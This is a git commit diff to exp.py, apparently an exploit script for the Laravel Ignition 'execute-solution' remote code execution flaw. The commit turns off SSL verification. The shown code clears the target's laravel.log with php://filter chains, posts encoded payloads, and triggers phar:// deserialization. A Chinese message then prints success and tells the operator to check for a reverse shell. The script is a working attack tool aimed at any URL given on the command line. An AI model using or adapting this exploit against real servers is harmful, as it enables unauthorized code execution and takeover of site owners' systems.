c0ad4d54c8cb5b6bf20a67d05d9754d93f45b702
戳戳龙 <chlxu2000@foxmail.com>
2021-04-10 10:29:26 +0800

    turn off ssl verify

--- exp.py
+++ exp.py
@@ -23,8 +23,8 @@ _______________   ________  ____          ________  ____________  ________
     clear_log_payload={"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"username","viewFile":"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"}}
     headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0","Content-Type":"application/json"}
     # 先清空log(必须要2次)
-    a=requests.post(str(sys.argv[1])+"/_ignition/execute-solution",headers=headers,json=clear_log_payload)
-    a=requests.post(str(sys.argv[1])+"/_ignition/execute-solution",headers=headers,json=clear_log_payload)
+    a=requests.post(str(sys.argv[1])+"/_ignition/execute-solution",headers=headers,json=clear_log_payload,verify = False)
+    a=requests.post(str(sys.argv[1])+"/_ignition/execute-solution",headers=headers,json=clear_log_payload,verify = False)
     if(a.status_code==200):
         print("清空log成功")
     # 生成并且尝试payload
@@ -44,15 +44,15 @@ _______________   ________  ____          ________  ____________  ________
         test_payload=payload[i:]
         # print(test_payload)
         attack_payload={"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"username","viewFile":test_payload}}
-        a=requests.post(str(sys.argv[1])+"/_ignition/execute-solution",headers=headers,json=attack_payload)
+        a=requests.post(str(sys.argv[1])+"/_ignition/execute-solution",headers=headers,json=attack_payload,verify = False)
         print(a.url)
 
         attack_payload2={"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"username","viewFile":"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"}}
-        a=requests.post(str(sys.argv[1])+"/_ignition/execute-solution",headers=headers,json=attack_payload2)
+        a=requests.post(str(sys.argv[1])+"/_ignition/execute-solution",headers=headers,json=attack_payload2,verify = False)
         print(a.status_code)
 
         attack_payload3={"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"username","viewFile":"phar://../storage/logs/laravel.log"}}
-        a=requests.post(str(sys.argv[1])+"/_ignition/execute-solution",headers=headers,json=attack_payload3)
+        a=requests.post(str(sys.argv[1])+"/_ignition/execute-solution",headers=headers,json=attack_payload3,verify = False)
         if("cannot be empty" in a.text):
             print("攻击成功,请检查是否反弹到shell")
     print("攻击结束....")
